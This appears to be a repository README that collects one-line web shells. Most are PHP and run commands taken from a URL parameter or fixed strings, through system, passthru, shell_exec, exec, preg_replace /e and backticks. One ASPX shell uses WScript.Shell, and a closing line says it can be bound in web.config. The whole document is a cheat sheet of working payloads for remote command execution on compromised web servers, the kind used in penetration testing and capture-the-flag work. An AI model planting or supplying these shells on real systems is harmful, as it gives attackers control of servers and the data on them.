# WebShells

#### This repo contains one liner web shells

# PHP Webshells

#### Execute one command
```<?php system("whoami"); ?>```

#### Take input from the url paramter. shell.php?cmd=whoami
```<?php system($_GET['cmd']); ?>```

#### The same but using passthru
```<?php passthru($_GET['cmd']); ?>```

#### For shell_exec to output the result you need to echo it
```<?php echo shell_exec("whoami");?>```

#### Exec() does not output the result without echo, and only output the last line. So not very useful!
```<?php echo exec("whoami");?>```

#### Instead to this if you can. It will return the output as an array, and then print it all.
```<?php exec("ls -la",$array); print_r($array); ?>```

#### preg_replace(). This is a cool trick
```<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>```

#### Using backticks
```<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>```

#### Using backticks
```<?php echo `whoami`; ?>```

#### Web shell with GUI
Try Sweetuu : ```github.com/cspshivam/sweetuu```

# ASPX Webshell

#### Execute Command
```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

This shell can be binded with ```web.config``` file
